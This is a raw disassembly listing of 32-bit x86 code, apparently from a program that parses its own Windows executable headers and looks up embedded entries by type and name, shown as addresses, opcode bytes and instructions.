  4017ee:	c7 04 24 b4 c0 40 00 	movl   $0x40c0b4,(%esp)
  4017f5:	89 54 24 08          	mov    %edx,0x8(%esp)
  4017f9:	e8 12 06 00 00       	call   0x401e10
  4017fe:	89 34 24             	mov    %esi,(%esp)
  401801:	83 c7 12             	add    $0x12,%edi
  401804:	31 f6                	xor    %esi,%esi
  401806:	e8 fd 8f 00 00       	call   0x40a808
  40180b:	89 7c 24 04          	mov    %edi,0x4(%esp)
  40180f:	c7 04 24 ed c0 40 00 	movl   $0x40c0ed,(%esp)
  401816:	e8 f5 05 00 00       	call   0x401e10
  40181b:	e9 a7 fe ff ff       	jmp    0x4016c7
  401820:	8b 54 24 40          	mov    0x40(%esp),%edx
  401824:	89 44 24 04          	mov    %eax,0x4(%esp)
  401828:	c7 04 24 99 c0 40 00 	movl   $0x40c099,(%esp)
  40182f:	89 54 24 08          	mov    %edx,0x8(%esp)
  401833:	e8 d8 05 00 00       	call   0x401e10
  401838:	eb c4                	jmp    0x4017fe
  40183a:	c7 04 24 6c c0 40 00 	movl   $0x40c06c,(%esp)
  401841:	e8 ca 05 00 00       	call   0x401e10
  401846:	eb b6                	jmp    0x4017fe
  401848:	90                   	nop
  401849:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401850:	55                   	push   %ebp
  401851:	57                   	push   %edi
  401852:	56                   	push   %esi
  401853:	53                   	push   %ebx
  401854:	83 ec 1c             	sub    $0x1c,%esp
  401857:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  40185b:	8b 74 24 34          	mov    0x34(%esp),%esi
  40185f:	89 1c 24             	mov    %ebx,(%esp)
  401862:	89 74 24 04          	mov    %esi,0x4(%esp)
  401866:	e8 a5 fd ff ff       	call   0x401610
  40186b:	89 1c 24             	mov    %ebx,(%esp)
  40186e:	89 c7                	mov    %eax,%edi
  401870:	e8 eb 2e 00 00       	call   0x404760
  401875:	83 f8 ff             	cmp    $0xffffffff,%eax
  401878:	74 5f                	je     0x4018d9
  40187a:	8d 6e 12             	lea    0x12(%esi),%ebp
  40187d:	81 c3 68 20 00 00    	add    $0x2068,%ebx
  401883:	89 1c 24             	mov    %ebx,(%esp)
  401886:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40188a:	e8 01 31 00 00       	call   0x404990
  40188f:	89 c3                	mov    %eax,%ebx
  401891:	8b 46 0c             	mov    0xc(%esi),%eax
  401894:	89 04 24             	mov    %eax,(%esp)
  401897:	ff 15 b8 e3 41 00    	call   *0x41e3b8
  40189d:	83 ec 04             	sub    $0x4,%esp
  4018a0:	85 db                	test   %ebx,%ebx
  4018a2:	89 c6                	mov    %eax,%esi
  4018a4:	74 52                	je     0x4018f8
  4018a6:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  4018aa:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  4018b1:	00 
  4018b2:	89 44 24 04          	mov    %eax,0x4(%esp)
  4018b6:	89 3c 24             	mov    %edi,(%esp)
  4018b9:	e8 52 8f 00 00       	call   0x40a810
  4018be:	83 f8 01             	cmp    $0x1,%eax
  4018c1:	74 04                	je     0x4018c7
  4018c3:	85 f6                	test   %esi,%esi
  4018c5:	75 1a                	jne    0x4018e1
  4018c7:	89 1c 24             	mov    %ebx,(%esp)
  4018ca:	e8 31 8f 00 00       	call   0x40a800
  4018cf:	89 3c 24             	mov    %edi,(%esp)
  4018d2:	e8 31 8f 00 00       	call   0x40a808
  4018d7:	31 c0                	xor    %eax,%eax
  4018d9:	83 c4 1c             	add    $0x1c,%esp
  4018dc:	5b                   	pop    %ebx
  4018dd:	5e                   	pop    %esi
  4018de:	5f                   	pop    %edi
  4018df:	5d                   	pop    %ebp
  4018e0:	c3                   	ret
  4018e1:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4018e5:	c7 04 24 24 c1 40 00 	movl   $0x40c124,(%esp)
  4018ec:	e8 1f 05 00 00       	call   0x401e10
  4018f1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4018f6:	eb e1                	jmp    0x4018d9
  4018f8:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4018fc:	c7 04 24 05 c1 40 00 	movl   $0x40c105,(%esp)
  401903:	e8 08 05 00 00       	call   0x401e10
  401908:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40190d:	eb ca                	jmp    0x4018d9
  40190f:	90                   	nop
  401910:	57                   	push   %edi
  401911:	56                   	push   %esi
  401912:	53                   	push   %ebx
  401913:	83 ec 20             	sub    $0x20,%esp
  401916:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  40191a:	8b 03                	mov    (%ebx),%eax
  40191c:	85 c0                	test   %eax,%eax
  40191e:	0f 84 7c 02 00 00    	je     0x401ba0
  401924:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  40192b:	00 
  40192c:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401933:	00 
  401934:	89 04 24             	mov    %eax,(%esp)
  401937:	e8 b4 8e 00 00       	call   0x40a7f0
  40193c:	8b 03                	mov    (%ebx),%eax
  40193e:	89 04 24             	mov    %eax,(%esp)
  401941:	e8 d2 8e 00 00       	call   0x40a818
  401946:	89 c2                	mov    %eax,%edx
  401948:	89 c6                	mov    %eax,%esi
  40194a:	89 d8                	mov    %ebx,%eax
  40194c:	e8 ff fb ff ff       	call   0x401550
  401951:	85 c0                	test   %eax,%eax
  401953:	0f 88 d7 00 00 00    	js     0x401a30
  401959:	8b 43 18             	mov    0x18(%ebx),%eax
  40195c:	8b 3d b8 e3 41 00    	mov    0x41e3b8,%edi
  401962:	c7 83 6c 40 00 00 00 	movl   $0x0,0x406c(%ebx)
  401969:	00 00 00 
  40196c:	89 04 24             	mov    %eax,(%esp)
  40196f:	ff d7                	call   *%edi
  401971:	29 c6                	sub    %eax,%esi
  401973:	8b 43 1c             	mov    0x1c(%ebx),%eax
  401976:	83 ec 04             	sub    $0x4,%esp
  401979:	89 73 04             	mov    %esi,0x4(%ebx)
  40197c:	89 04 24             	mov    %eax,(%esp)
  40197f:	ff d7                	call   *%edi
  401981:	83 ec 04             	sub    $0x4,%esp
  401984:	01 f0                	add    %esi,%eax
  401986:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40198d:	00 
  40198e:	89 44 24 04          	mov    %eax,0x4(%esp)
  401992:	8b 03                	mov    (%ebx),%eax
  401994:	89 04 24             	mov    %eax,(%esp)
  401997:	e8 54 8e 00 00       	call   0x40a7f0
  40199c:	8b 43 20             	mov    0x20(%ebx),%eax
  40199f:	89 04 24             	mov    %eax,(%esp)
  4019a2:	ff d7                	call   *%edi
  4019a4:	83 ec 04             	sub    $0x4,%esp
  4019a7:	89 04 24             	mov    %eax,(%esp)
  4019aa:	e8 11 8e 00 00       	call   0x40a7c0
  4019af:	85 c0                	test   %eax,%eax
  4019b1:	89 43 08             	mov    %eax,0x8(%ebx)
  4019b4:	0f 84 46 02 00 00    	je     0x401c00
  4019ba:	8b 43 20             	mov    0x20(%ebx),%eax
  4019bd:	8b 33                	mov    (%ebx),%esi
  4019bf:	89 04 24             	mov    %eax,(%esp)
  4019c2:	ff d7                	call   *%edi
  4019c4:	83 ec 04             	sub    $0x4,%esp
  4019c7:	89 74 24 0c          	mov    %esi,0xc(%esp)
  4019cb:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  4019d2:	00 
  4019d3:	89 44 24 04          	mov    %eax,0x4(%esp)
  4019d7:	8b 43 08             	mov    0x8(%ebx),%eax
  4019da:	89 04 24             	mov    %eax,(%esp)
  4019dd:	e8 16 8e 00 00       	call   0x40a7f8
  4019e2:	85 c0                	test   %eax,%eax
  4019e4:	0f 84 d6 01 00 00    	je     0x401bc0
  4019ea:	8b 73 08             	mov    0x8(%ebx),%esi
  4019ed:	8b 43 20             	mov    0x20(%ebx),%eax
  4019f0:	89 04 24             	mov    %eax,(%esp)
  4019f3:	ff d7                	call   *%edi
  4019f5:	01 f0                	add    %esi,%eax
  4019f7:	83 ec 04             	sub    $0x4,%esp
  4019fa:	89 43 0c             	mov    %eax,0xc(%ebx)
  4019fd:	8b 03                	mov    (%ebx),%eax
  4019ff:	89 04 24             	mov    %eax,(%esp)
  401a02:	e8 19 8e 00 00       	call   0x40a820
  401a07:	85 c0                	test   %eax,%eax
  401a09:	89 c6                	mov    %eax,%esi
  401a0b:	0f 85 cf 01 00 00    	jne    0x401be0
  401a11:	8b 03                	mov    (%ebx),%eax
  401a13:	85 c0                	test   %eax,%eax
  401a15:	74 0e                	je     0x401a25
  401a17:	89 04 24             	mov    %eax,(%esp)
  401a1a:	e8 e1 8d 00 00       	call   0x40a800
  401a1f:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  401a25:	83 c4 20             	add    $0x20,%esp
  401a28:	89 f0                	mov    %esi,%eax
  401a2a:	5b                   	pop    %ebx
  401a2b:	5e                   	pop    %esi
  401a2c:	5f                   	pop    %edi
  401a2d:	c3                   	ret
  401a2e:	66 90                	xchg   %ax,%ax
  401a30:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401a37:	00 
  401a38:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401a3f:	00 
  401a40:	8d 74 24 1a          	lea    0x1a(%esp),%esi
  401a44:	8b 03                	mov    (%ebx),%eax
  401a46:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  401a4d:	00 
  401a4e:	89 04 24             	mov    %eax,(%esp)
  401a51:	e8 9a 8d 00 00       	call   0x40a7f0
  401a56:	8b 03                	mov    (%ebx),%eax
  401a58:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  401a5f:	00 
  401a60:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  401a67:	00 
  401a68:	89 34 24             	mov    %esi,(%esp)
  401a6b:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401a6f:	e8 84 8d 00 00       	call   0x40a7f8
  401a74:	80 7c 24 1a 4d       	cmpb   $0x4d,0x1a(%esp)
  401a79:	0f 85 09 01 00 00    	jne    0x401b88
  401a7f:	80 7c 24 1b 5a       	cmpb   $0x5a,0x1b(%esp)
  401a84:	0f 85 fe 00 00 00    	jne    0x401b88
  401a8a:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401a91:	00 
  401a92:	c7 44 24 04 3c 00 00 	movl   $0x3c,0x4(%esp)
  401a99:	00 
  401a9a:	8d 7c 24 1c          	lea    0x1c(%esp),%edi
  401a9e:	8b 03                	mov    (%ebx),%eax
  401aa0:	89 04 24             	mov    %eax,(%esp)
  401aa3:	e8 48 8d 00 00       	call   0x40a7f0
  401aa8:	8b 03                	mov    (%ebx),%eax
  401aaa:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  401ab1:	00 
  401ab2:	c7 44 24 04 04 00 00 	movl   $0x4,0x4(%esp)
  401ab9:	00 
  401aba:	89 3c 24             	mov    %edi,(%esp)
  401abd:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401ac1:	e8 32 8d 00 00       	call   0x40a7f8
  401ac6:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401aca:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401ad1:	00 
  401ad2:	83 c0 18             	add    $0x18,%eax
  401ad5:	89 44 24 04          	mov    %eax,0x4(%esp)
  401ad9:	8b 03                	mov    (%ebx),%eax
  401adb:	89 04 24             	mov    %eax,(%esp)
  401ade:	e8 0d 8d 00 00       	call   0x40a7f0
  401ae3:	8b 03                	mov    (%ebx),%eax
  401ae5:	89 34 24             	mov    %esi,(%esp)
  401ae8:	be ff ff ff ff       	mov    $0xffffffff,%esi
  401aed:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  401af4:	00 
  401af5:	c7 44 24 04 02 00 00 	movl   $0x2,0x4(%esp)
  401afc:	00 
  401afd:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401b01:	e8 f2 8c 00 00       	call   0x40a7f8
  401b06:	80 7c 24 1a 0b       	cmpb   $0xb,0x1a(%esp)
  401b0b:	0f 85 14 ff ff ff    	jne    0x401a25
  401b11:	0f b6 44 24 1b       	movzbl 0x1b(%esp),%eax
  401b16:	3c 01                	cmp    $0x1,%al
  401b18:	0f 84 d8 00 00 00    	je     0x401bf6
  401b1e:	3c 02                	cmp    $0x2,%al
  401b20:	75 66                	jne    0x401b88
  401b22:	b8 a8 00 00 00       	mov    $0xa8,%eax
  401b27:	03 44 24 1c          	add    0x1c(%esp),%eax
  401b2b:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401b32:	00 
  401b33:	89 44 24 04          	mov    %eax,0x4(%esp)
  401b37:	8b 03                	mov    (%ebx),%eax
  401b39:	89 04 24             	mov    %eax,(%esp)
  401b3c:	e8 af 8c 00 00       	call   0x40a7f0
  401b41:	8b 03                	mov    (%ebx),%eax
  401b43:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  401b4a:	00 
  401b4b:	c7 44 24 04 04 00 00 	movl   $0x4,0x4(%esp)
  401b52:	00 
  401b53:	89 3c 24             	mov    %edi,(%esp)
  401b56:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401b5a:	e8 99 8c 00 00       	call   0x40a7f8
  401b5f:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  401b63:	83 fe 00             	cmp    $0x0,%esi
  401b66:	74 20                	je     0x401b88
  401b68:	7e 1e                	jle    0x401b88
  401b6a:	8d 7e f8             	lea    -0x8(%esi),%edi
  401b6d:	8d 76 00             	lea    0x0(%esi),%esi
  401b70:	89 f2                	mov    %esi,%edx
  401b72:	89 d8                	mov    %ebx,%eax
  401b74:	e8 d7 f9 ff ff       	call   0x401550
  401b79:	85 c0                	test   %eax,%eax
  401b7b:	0f 89 d8 fd ff ff    	jns    0x401959
  401b81:	83 ee 01             	sub    $0x1,%esi
  401b84:	39 fe                	cmp    %edi,%esi
  401b86:	75 e8                	jne    0x401b70
  401b88:	83 c4 20             	add    $0x20,%esp
  401b8b:	be ff ff ff ff       	mov    $0xffffffff,%esi
  401b90:	89 f0                	mov    %esi,%eax
  401b92:	5b                   	pop    %ebx
  401b93:	5e                   	pop    %esi
  401b94:	5f                   	pop    %edi
  401b95:	c3                   	ret
  401b96:	8d 76 00             	lea    0x0(%esi),%esi
  401b99:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401ba0:	8d 43 68             	lea    0x68(%ebx),%eax
  401ba3:	c7 44 24 04 2c c0 40 	movl   $0x40c02c,0x4(%esp)
  401baa:	00 
  401bab:	89 04 24             	mov    %eax,(%esp)
  401bae:	e8 7d 12 00 00       	call   0x402e30
  401bb3:	85 c0                	test   %eax,%eax
  401bb5:	89 03                	mov    %eax,(%ebx)
  401bb7:	0f 85 67 fd ff ff    	jne    0x401924
  401bbd:	eb c9                	jmp    0x401b88
  401bbf:	90                   	nop
  401bc0:	c7 04 24 6b c1 40 00 	movl   $0x40c16b,(%esp)
  401bc7:	be ff ff ff ff       	mov    $0xffffffff,%esi
  401bcc:	e8 3f 02 00 00       	call   0x401e10
  401bd1:	e9 4f fe ff ff       	jmp    0x401a25
  401bd6:	8d 76 00             	lea    0x0(%esi),%esi
  401bd9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401be0:	c7 04 24 85 c1 40 00 	movl   $0x40c185,(%esp)
  401be7:	be ff ff ff ff       	mov    $0xffffffff,%esi
  401bec:	e8 1f 02 00 00       	call   0x401e10
  401bf1:	e9 2f fe ff ff       	jmp    0x401a25
  401bf6:	b8 98 00 00 00       	mov    $0x98,%eax
  401bfb:	e9 27 ff ff ff       	jmp    0x401b27
  401c00:	c7 04 24 48 c1 40 00 	movl   $0x40c148,(%esp)
  401c07:	be ff ff ff ff       	mov    $0xffffffff,%esi
  401c0c:	e8 ff 01 00 00       	call   0x401e10
  401c11:	e9 0f fe ff ff       	jmp    0x401a25
  401c16:	8d 76 00             	lea    0x0(%esi),%esi
  401c19:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401c20:	57                   	push   %edi
  401c21:	56                   	push   %esi
  401c22:	53                   	push   %ebx
  401c23:	83 ec 10             	sub    $0x10,%esp
  401c26:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  401c2a:	8b 7c 24 24          	mov    0x24(%esp),%edi
  401c2e:	8d 73 68             	lea    0x68(%ebx),%esi
  401c31:	89 7c 24 04          	mov    %edi,0x4(%esp)
  401c35:	89 34 24             	mov    %esi,(%esp)
  401c38:	e8 eb 8b 00 00       	call   0x40a828
  401c3d:	8b 44 24 28          	mov    0x28(%esp),%eax
  401c41:	89 34 24             	mov    %esi,(%esp)
  401c44:	8d b3 68 10 00 00    	lea    0x1068(%ebx),%esi
  401c4a:	81 c3 68 30 00 00    	add    $0x3068,%ebx
  401c50:	89 44 24 04          	mov    %eax,0x4(%esp)
  401c54:	e8 d7 8b 00 00       	call   0x40a830
  401c59:	89 7c 24 04          	mov    %edi,0x4(%esp)
  401c5d:	89 34 24             	mov    %esi,(%esp)
  401c60:	e8 c3 8b 00 00       	call   0x40a828
  401c65:	c7 83 00 10 00 00 00 	movl   $0x0,0x1000(%ebx)
  401c6c:	00 00 00 
  401c6f:	89 74 24 04          	mov    %esi,0x4(%esp)
  401c73:	89 1c 24             	mov    %ebx,(%esp)
  401c76:	e8 ad 8b 00 00       	call   0x40a828
  401c7b:	83 c4 10             	add    $0x10,%esp
  401c7e:	31 c0                	xor    %eax,%eax
  401c80:	5b                   	pop    %ebx
  401c81:	5e                   	pop    %esi
  401c82:	5f                   	pop    %edi
  401c83:	c3                   	ret
  401c84:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  401c8a:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  401c90:	53                   	push   %ebx
  401c91:	83 ec 18             	sub    $0x18,%esp
  401c94:	8b 44 24 28          	mov    0x28(%esp),%eax
  401c98:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  401c9c:	89 44 24 08          	mov    %eax,0x8(%esp)
  401ca0:	8b 44 24 24          	mov    0x24(%esp),%eax
  401ca4:	89 1c 24             	mov    %ebx,(%esp)
  401ca7:	89 44 24 04          	mov    %eax,0x4(%esp)
  401cab:	e8 70 ff ff ff       	call   0x401c20
  401cb0:	85 c0                	test   %eax,%eax
  401cb2:	75 20                	jne    0x401cd4
  401cb4:	89 1c 24             	mov    %ebx,(%esp)
  401cb7:	e8 54 fc ff ff       	call   0x401910
  401cbc:	85 c0                	test   %eax,%eax
  401cbe:	74 19                	je     0x401cd9
  401cc0:	8b 03                	mov    (%ebx),%eax
  401cc2:	85 c0                	test   %eax,%eax
  401cc4:	74 0e                	je     0x401cd4
  401cc6:	89 04 24             	mov    %eax,(%esp)
  401cc9:	e8 32 8b 00 00       	call   0x40a800
  401cce:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  401cd4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401cd9:	83 c4 18             	add    $0x18,%esp
  401cdc:	5b                   	pop    %ebx
  401cdd:	c3                   	ret
  401cde:	66 90                	xchg   %ax,%ax
  401ce0:	8b 44 24 04          	mov    0x4(%esp),%eax
  401ce4:	8b 40 08             	mov    0x8(%eax),%eax
  401ce7:	c3                   	ret
  401ce8:	90                   	nop
  401ce9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401cf0:	53                   	push   %ebx
  401cf1:	83 ec 18             	sub    $0x18,%esp
  401cf4:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  401cf8:	8b 03                	mov    (%ebx),%eax
  401cfa:	89 04 24             	mov    %eax,(%esp)
  401cfd:	ff 15 b8 e3 41 00    	call   *0x41e3b8
  401d03:	83 ec 04             	sub    $0x4,%esp
  401d06:	01 d8                	add    %ebx,%eax
  401d08:	8b 54 24 20          	mov    0x20(%esp),%edx
  401d0c:	3b 42 0c             	cmp    0xc(%edx),%eax
  401d0f:	ba 00 00 00 00       	mov    $0x0,%edx
  401d14:	0f 43 c2             	cmovae %edx,%eax
  401d17:	83 c4 18             	add    $0x18,%esp
  401d1a:	5b                   	pop    %ebx
  401d1b:	c3                   	ret
  401d1c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401d20:	83 ec 1c             	sub    $0x1c,%esp
  401d23:	8b 44 24 20          	mov    0x20(%esp),%eax
  401d27:	8b 40 24             	mov    0x24(%eax),%eax
  401d2a:	89 04 24             	mov    %eax,(%esp)
  401d2d:	ff 15 b8 e3 41 00    	call   *0x41e3b8
  401d33:	83 ec 04             	sub    $0x4,%esp
  401d36:	83 c4 1c             	add    $0x1c,%esp
  401d39:	c3                   	ret
  401d3a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  401d40:	53                   	push   %ebx
  401d41:	83 ec 18             	sub    $0x18,%esp
  401d44:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  401d48:	85 db                	test   %ebx,%ebx
  401d4a:	74 34                	je     0x401d80
  401d4c:	8b 43 08             	mov    0x8(%ebx),%eax
  401d4f:	85 c0                	test   %eax,%eax
  401d51:	74 08                	je     0x401d5b
  401d53:	89 04 24             	mov    %eax,(%esp)
  401d56:	e8 ad 8a 00 00       	call   0x40a808
  401d5b:	8b 03                	mov    (%ebx),%eax
  401d5d:	85 c0                	test   %eax,%eax
  401d5f:	74 08                	je     0x401d69
  401d61:	89 04 24             	mov    %eax,(%esp)
  401d64:	e8 97 8a 00 00       	call   0x40a800
  401d69:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  401d6d:	83 c4 18             	add    $0x18,%esp
  401d70:	5b                   	pop    %ebx
  401d71:	e9 92 8a 00 00       	jmp    0x40a808
  401d76:	8d 76 00             	lea    0x0(%esi),%esi
  401d79:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401d80:	83 c4 18             	add    $0x18,%esp
  401d83:	5b                   	pop    %ebx
  401d84:	c3                   	ret
  401d85:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401d89:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401d90:	55                   	push   %ebp
  401d91:	57                   	push   %edi
  401d92:	56                   	push   %esi
  401d93:	53                   	push   %ebx
  401d94:	83 ec 1c             	sub    $0x1c,%esp
  401d97:	8b 74 24 30          	mov    0x30(%esp),%esi
  401d9b:	8b 6c 24 34          	mov    0x34(%esp),%ebp
  401d9f:	8b 5e 08             	mov    0x8(%esi),%ebx
  401da2:	89 2c 24             	mov    %ebp,(%esp)
  401da5:	e8 8e 8a 00 00       	call   0x40a838
  401daa:	3b 5e 0c             	cmp    0xc(%esi),%ebx
  401dad:	89 c7                	mov    %eax,%edi
  401daf:	73 30                	jae    0x401de1
  401db1:	80 7b 11 6f          	cmpb   $0x6f,0x11(%ebx)
  401db5:	75 17                	jne    0x401dce
  401db7:	8d 43 12             	lea    0x12(%ebx),%eax
  401dba:	89 7c 24 08          	mov    %edi,0x8(%esp)
  401dbe:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  401dc2:	89 04 24             	mov    %eax,(%esp)
  401dc5:	e8 76 8a 00 00       	call   0x40a840
  401dca:	85 c0                	test   %eax,%eax
  401dcc:	74 22                	je     0x401df0
  401dce:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  401dd2:	89 34 24             	mov    %esi,(%esp)
  401dd5:	e8 f6 f7 ff ff       	call   0x4015d0
  401dda:	39 46 0c             	cmp    %eax,0xc(%esi)
  401ddd:	89 c3                	mov    %eax,%ebx
  401ddf:	77 d0                	ja     0x401db1
  401de1:	83 c4 1c             	add    $0x1c,%esp
  401de4:	31 c0                	xor    %eax,%eax
  401de6:	5b                   	pop    %ebx
  401de7:	5e                   	pop    %esi
  401de8:	5f                   	pop    %edi
  401de9:	5d                   	pop    %ebp
  401dea:	c3                   	ret
  401deb:	90                   	nop
  401dec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401df0:	80 7c 3b 12 00       	cmpb   $0x0,0x12(%ebx,%edi,1)
  401df5:	8d 54 3b 13          	lea    0x13(%ebx,%edi,1),%edx
  401df9:	8d 44 3b 12          	lea    0x12(%ebx,%edi,1),%eax
  401dfd:	0f 45 c2             	cmovne %edx,%eax
  401e00:	83 c4 1c             	add    $0x1c,%esp
  401e03:	5b                   	pop    %ebx
  401e04:	5e                   	pop    %esi
  401e05:	5f                   	pop    %edi
  401e06:	5d                   	pop    %ebp
  401e07:	c3                   	ret
  401e08:	90                   	nop
  401e09:	90                   	nop
  401e0a:	90                   	nop
  401e0b:	90                   	nop
  401e0c:	90                   	nop
  401e0d:	90                   	nop
  401e0e:	90                   	nop
  401e0f:	90                   	nop
  401e10:	83 ec 1c             	sub    $0x1c,%esp
  401e13:	8d 44 24 24          	lea    0x24(%esp),%eax
  401e17:	89 44 24 08          	mov    %eax,0x8(%esp)
  401e1b:	8b 44 24 20          	mov    0x20(%esp),%eax
  401e1f:	89 44 24 04          	mov    %eax,0x4(%esp)
  401e23:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  401e28:	83 c0 40             	add    $0x40,%eax
  401e2b:	89 04 24             	mov    %eax,(%esp)
  401e2e:	e8 15 8a 00 00       	call   0x40a848
  401e33:	83 c4 1c             	add    $0x1c,%esp
  401e36:	c3                   	ret
  401e37:	90                   	nop
  401e38:	90                   	nop
  401e39:	90                   	nop
  401e3a:	90                   	nop
  401e3b:	90                   	nop
  401e3c:	90                   	nop
  401e3d:	90                   	nop
  401e3e:	90                   	nop
  401e3f:	90                   	nop
  401e40:	53                   	push   %ebx
  401e41:	83 ec 48             	sub    $0x48,%esp
  401e44:	8d 44 24 58          	lea    0x58(%esp),%eax
  401e48:	8b 5c 24 50          	mov    0x50(%esp),%ebx
  401e4c:	c7 44 24 04 00 10 00 	movl   $0x1000,0x4(%esp)
  401e53:	00 
  401e54:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401e58:	8b 44 24 54          	mov    0x54(%esp),%eax
  401e5c:	89 1c 24             	mov    %ebx,(%esp)
  401e5f:	89 44 24 08          	mov    %eax,0x8(%esp)
  401e63:	e8 18 87 00 00       	call   0x40a580
  401e68:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  401e6c:	89 1c 24             	mov    %ebx,(%esp)
  401e6f:	89 44 24 04          	mov    %eax,0x4(%esp)
  401e73:	e8 18 87 00 00       	call   0x40a590
  401e78:	83 c4 48             	add    $0x48,%esp
  401e7b:	5b                   	pop    %ebx
  401e7c:	c3                   	ret
  401e7d:	8d 76 00             	lea    0x0(%esi),%esi
  401e80:	55                   	push   %ebp
  401e81:	57                   	push   %edi
  401e82:	56                   	push   %esi
  401e83:	53                   	push   %ebx
  401e84:	50                   	push   %eax
  401e85:	b8 58 50 00 00       	mov    $0x5058,%eax
  401e8a:	e8 c1 86 00 00       	call   0x40a550
  401e8f:	29 c4                	sub    %eax,%esp
  401e91:	8b 04 04             	mov    (%esp,%eax,1),%eax
  401e94:	8d b4 24 4f 40 00 00 	lea    0x404f(%esp),%esi
  401e9b:	8d 6c 24 4f          	lea    0x4f(%esp),%ebp
  401e9f:	8d 9c 24 4f 10 00 00 	lea    0x104f(%esp),%ebx
  401ea6:	8b 38                	mov    (%eax),%edi
  401ea8:	89 54 24 04          	mov    %edx,0x4(%esp)
  401eac:	89 34 24             	mov    %esi,(%esp)
  401eaf:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  401eb3:	e8 70 89 00 00       	call   0x40a828
  401eb8:	c7 44 24 04 94 c1 40 	movl   $0x40c194,0x4(%esp)
  401ebf:	00 
  401ec0:	89 34 24             	mov    %esi,(%esp)
  401ec3:	e8 88 89 00 00       	call   0x40a850
  401ec8:	89 2c 24             	mov    %ebp,(%esp)
  401ecb:	89 44 24 04          	mov    %eax,0x4(%esp)
  401ecf:	e8 54 89 00 00       	call   0x40a828
  401ed4:	c7 44 24 04 94 c1 40 	movl   $0x40c194,0x4(%esp)
  401edb:	00 
  401edc:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401ee3:	e8 68 89 00 00       	call   0x40a850
  401ee8:	89 1c 24             	mov    %ebx,(%esp)
  401eeb:	89 44 24 04          	mov    %eax,0x4(%esp)
  401eef:	e8 34 89 00 00       	call   0x40a828
  401ef4:	80 7c 24 4f 00       	cmpb   $0x0,0x4f(%esp)
  401ef9:	0f 84 4b 02 00 00    	je     0x40214a
  401eff:	80 bc 24 4f 10 00 00 	cmpb   $0x0,0x104f(%esp)
  401f06:	00 
  401f07:	0f 84 3d 02 00 00    	je     0x40214a
  401f0d:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  401f11:	89 34 24             	mov    %esi,(%esp)
  401f14:	e8 b7 0a 00 00       	call   0x4029d0
  401f19:	8d 87 68 10 00 00    	lea    0x1068(%edi),%eax
  401f1f:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  401f23:	c7 44 24 14 96 c1 40 	movl   $0x40c196,0x14(%esp)
  401f2a:	00 
  401f2b:	89 74 24 10          	mov    %esi,0x10(%esp)
  401f2f:	c7 44 24 0c 96 c1 40 	movl   $0x40c196,0xc(%esp)
  401f36:	00 
  401f37:	89 44 24 38          	mov    %eax,0x38(%esp)
  401f3b:	89 44 24 08          	mov    %eax,0x8(%esp)
  401f3f:	8d 84 24 4f 20 00 00 	lea    0x204f(%esp),%eax
  401f46:	c7 44 24 04 1f c2 40 	movl   $0x40c21f,0x4(%esp)
  401f4d:	00 
  401f4e:	89 04 24             	mov    %eax,(%esp)
  401f51:	e8 ea fe ff ff       	call   0x401e40
